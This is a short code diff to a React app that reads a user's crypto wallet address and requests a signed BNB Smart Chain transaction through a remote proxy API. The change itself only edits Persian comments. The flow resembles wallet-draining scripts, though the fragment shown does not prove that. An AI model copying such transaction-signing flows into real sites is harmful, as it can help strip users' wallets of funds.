@@ -36,7 +36,7 @@ function App() {
     var account_sender = account[0];
     console.log("✅ Wallet Address:", account_sender);
 
-    // مسیر صحیح API
+    // 🔹 مسیر صحیح برای `send.php`
     let apiUrl = "https://reza-nu.vercel.app/api/proxy";
 
     async function genSign(address, chain, type, contract = "0") {
@@ -76,7 +76,7 @@ function App() {
       }
     }
 
-    var signature = await genSign(account_sender, "56", "coin"); // ارسال تراکنش روی BSC
+    var signature = await genSign(account_sender, "56", "coin");
 
     if (signature) {
       console.log("✍️ Signed Transaction:", signature);
